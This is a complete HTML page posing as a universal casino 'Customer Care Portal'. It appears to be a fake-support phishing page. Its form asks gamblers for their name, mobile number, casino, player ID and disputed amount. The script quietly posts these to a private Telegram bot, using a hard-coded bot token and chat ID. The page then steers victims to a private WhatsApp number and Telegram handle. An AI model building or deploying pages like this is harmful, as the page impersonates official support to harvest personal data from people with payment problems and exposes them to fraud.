<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">

<title>All Casino Games Support Portal</title>

<style>
* {
    box-sizing: border-box;
    margin: 0;
    padding: 0;
    font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
}

body {
    /* Colorful dark background */
    background: linear-gradient(135deg, #1a0b2e 0%, #0d1b2a 100%);
    display: flex;
    justify-content: center;
    color: #ffffff;
    min-height: 100vh;
}

.app-container {
    width: 100%;
    max-width: 440px;
    min-height: 100vh;
    background: rgba(20, 30, 48, 0.6);
    backdrop-filter: blur(10px);
    display: flex;
    flex-direction: column;
    position: relative;
    box-shadow: 0 0 25px rgba(0,0,0,0.8);
}

/* HEADER */
.header {
    background: linear-gradient(90deg, #ff007a, #7928ca);
    display: flex;
    align-items: center;
    justify-content: center;
    padding: 18px 15px;
    box-shadow: 0 4px 15px rgba(255, 0, 122, 0.4);
    position: sticky;
    top: 0;
    z-index: 10;
    text-align: center;
}

.header h1 {
    font-size: 18px;
    font-weight: 900;
    color: #fff;
    text-transform: uppercase;
    letter-spacing: 0.5px;
    text-shadow: 0 2px 5px rgba(0,0,0,0.5);
}

/* MAIN CONTENT */
.main-content {
    flex: 1;
    padding: 20px 15px;
}

.welcome-text {
    text-align: center;
    margin-bottom: 20px;
}

.welcome-text p {
    font-size: 14px;
    color: #a8b2c1;
    line-height: 1.5;
}

/* FORM BOX */
.form-box {
    background: rgba(255, 255, 255, 0.05);
    border-radius: 12px;
    padding: 20px 15px;
    border: 1px solid rgba(255, 255, 255, 0.1);
    box-shadow: 0 8px 20px rgba(0,0,0,0.3);
}

.field {
    margin-bottom: 18px;
}

.field label {
    display: block;
    font-size: 12px;
    font-weight: 700;
    color: #00e5ff; /* Cyan color */
    margin-bottom: 6px;
    text-transform: uppercase;
    letter-spacing: 0.5px;
}

.field input,
.field select {
    width: 100%;
    padding: 14px;
    border-radius: 8px;
    border: 1px solid rgba(255, 255, 255, 0.2);
    background: rgba(0, 0, 0, 0.4);
    font-size: 14px;
    font-weight: 600;
    color: #fff;
    outline: none;
    transition: 0.3s ease;
}

.field input::placeholder {
    color: #7b8ea8;
}

.field input:focus,
.field select:focus {
    border-color: #ff007a;
    background: rgba(0, 0, 0, 0.6);
    box-shadow: 0 0 10px rgba(255, 0, 122, 0.3);
}

.field select option {
    background: #1a1a2e;
    color: #fff;
}

/* BUTTONS SECTION */
.action-buttons {
    margin-top: 25px;
    display: flex;
    flex-direction: column;
    gap: 12px;
}

/* 1. SUBMIT BUTTON */
.submit-btn {
    width: 100%;
    background: linear-gradient(90deg, #ff9a9e 0%, #fecfef 99%, #fecfef 100%);
    background: linear-gradient(to right, #f9d423 0%, #ff4e50 100%);
    color: #fff;
    border: none;
    padding: 16px;
    font-size: 16px;
    font-weight: 900;
    border-radius: 8px;
    cursor: pointer;
    text-transform: uppercase;
    box-shadow: 0 4px 15px rgba(255, 78, 80, 0.4);
    transition: 0.2s;
}

.submit-btn:active {
    transform: scale(0.98);
}

.submit-btn:disabled {
    opacity: 0.7;
    cursor: not-allowed;
}

/* 2. WHATSAPP BUTTON */
.whatsapp-btn {
    width: 100%;
    background: linear-gradient(to right, #11998e, #38ef7d);
    color: #fff;
    text-align: center;
    text-decoration: none;
    padding: 16px;
    font-size: 15px;
    font-weight: 800;
    border-radius: 8px;
    display: flex;
    justify-content: center;
    align-items: center;
    gap: 8px;
    box-shadow: 0 4px 15px rgba(56, 239, 125, 0.3);
    transition: 0.2s;
}

/* 3. TELEGRAM BUTTON */
.telegram-btn {
    width: 100%;
    background: linear-gradient(to right, #00c6ff, #0072ff);
    color: #fff;
    text-align: center;
    text-decoration: none;
    padding: 16px;
    font-size: 15px;
    font-weight: 800;
    border-radius: 8px;
    display: flex;
    justify-content: center;
    align-items: center;
    gap: 8px;
    box-shadow: 0 4px 15px rgba(0, 114, 255, 0.3);
    transition: 0.2s;
}

/* FOOTER */
.footer-text {
    text-align: center;
    margin-top: 30px;
    font-size: 12px;
    color: #a8b2c1;
    padding-bottom: 20px;
}

.footer-text strong {
    color: #00e5ff;
}
</style>
</head>

<body>

<div class="app-container">

    <!-- Header Section -->
    <header class="header">
        <h1>All Casino Games Customer Care Portal</h1>
    </header>

    <!-- Main Content -->
    <main class="main-content">
        
        <div class="welcome-text">
            <p>Fast and Secure Account Support for All Platforms.</p>
        </div>

        <div class="form-box">
            <form id="supportForm">
                
                <div class="field">
                    <label>Full Name</label>
                    <input type="text" id="name" placeholder="Enter your full name" required>
                </div>

                <div class="field">
                    <label>Registered Mobile</label>
                    <input type="tel" id="mobile" placeholder="Enter mobile number" required>
                </div>

                <div class="field">
                    <label>Casino Name</label>
                    <input type="text" id="platform" placeholder="e.g. Parimatch, 4rabet, etc." required>
                </div>

                <div class="field">
                    <label>User ID / Game ID</label>
                    <input type="text" id="userid" placeholder="Enter your Player ID" required>
                </div>

                <div class="field">
                    <label>Amount (₹)</label>
                    <input type="number" id="amount" placeholder="Enter amount" required>
                </div>

                <div class="field">
                    <label>Select Issue Type</label>
                    <select id="problem" required>
                        <option value="" disabled selected>Select an issue...</option>
                        <option value="Withdrawal Processing">Withdrawal Processing</option>
                        <option value="Withdrawal Declined">Withdrawal Declined</option>
                        <option value="Deposit Not Received">Deposit Not Received</option>
                        <option value="Account Verification (KYC)">Account Verification (KYC)</option>
                        <option value="ID Blocked">ID Blocked / Restricted</option>
                        <option value="Bonus Issue">Bonus / Promo Issue</option>
                        <option value="Other Issue">Other Issue</option>
                    </select>
                </div>

                <!-- BUTTONS SECTION -->
                <div class="action-buttons">
                    <!-- 1. Submit Request -->
                    <button type="submit" class="submit-btn" id="submitBtn">
                        Submit Request
                    </button>

                    <!-- 2. WhatsApp Button -->
                    <a href="https://wa.me/917300365084" target="_blank" class="whatsapp-btn">
                        🟢 Contact via WhatsApp
                    </a>

                    <!-- 3. Telegram Button -->
                    <a href="https://t.me/helpcare02" target="_blank" class="telegram-btn">
                        🔵 Contact via Telegram
                    </a>
                </div>

            </form>
        </div>

        <div class="footer-text">
            <strong>100% Safe & Secure</strong><br>
            Official Support Team will resolve your issue shortly.
        </div>

    </main>
</div>

<script>
// "Tu" (Beep) Sound Banane Ka Function
function playBeepSound() {
    try {
        const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
        const oscillator = audioCtx.createOscillator();
        const gainNode = audioCtx.createGain();
        
        oscillator.type = 'sine'; // Smooth beep sound
        oscillator.frequency.setValueAtTime(800, audioCtx.currentTime); // Frequency (Pitch)
        gainNode.gain.setValueAtTime(0.1, audioCtx.currentTime); // Volume control
        
        oscillator.connect(gainNode);
        gainNode.connect(audioCtx.destination);
        
        oscillator.start();
        oscillator.stop(audioCtx.currentTime + 0.15); // Sirf 0.15 seconds ke liye awaaz aayegi
    } catch(e) {
        console.log("Audio not supported");
    }
}

// Form Submit Hone Par Kya Hoga
document.getElementById("supportForm").addEventListener("submit", function(e) {
    e.preventDefault();

    // 1. Play Sound
    playBeepSound();

    const btn = document.getElementById("submitBtn");
    
    // Values nikalna
    const name = document.getElementById("name").value.trim();
    const mobile = document.getElementById("mobile").value.trim();
    const platform = document.getElementById("platform").value.trim();
    const userid = document.getElementById("userid").value.trim();
    const amount = document.getElementById("amount").value.trim();
    const problem = document.getElementById("problem").value;

    if (!name || !mobile || !platform || !userid || !amount || !problem) {
        alert("Please complete all details.");
        return;
    }

    // TELEGRAM DETAILS (Aapke diye hue)
    const botToken = "8939251323:AAEcW8aoTU69470Nje0NcmIOkFkiz3JVpWs";
    const chatId = "8151786936";
    const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;

    const time = new Date().toLocaleString("en-IN", { timeZone: "Asia/Kolkata" });
    
    // Message Format jo Telegram par aayega
    const message = `🎲 *ALL CASINO SUPPORT* 🎲\n\n👤 *Name:* ${name}\n📱 *Mobile:* ${mobile}\n🎰 *Casino:* ${platform}\n🆔 *User ID:* ${userid}\n💰 *Amount:* ₹${amount}\n⚠️ *Category:* ${problem}\n🕒 *Time:* ${time}`;

    btn.disabled = true;
    btn.innerText = "Processing...";

    fetch(telegramApiUrl, {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({
            chat_id: chatId,
            text: message,
            parse_mode: "Markdown"
        })
    })
    .then(response => {
        if (!response.ok) {
            throw new Error("Request failed");
        }
        return response.json();
    })
    .then(data => {
        alert("Request Submitted Successfully! Our team will resolve your issue.");
        document.getElementById("supportForm").reset();
    })
    .catch(error => {
        console.error(error);
        alert("Error sending request. Please use WhatsApp or Telegram button below.");
    })
    .finally(() => {
        btn.disabled = false;
        btn.innerText = "Submit Request";
    });
});
</script>

</body>
</html>
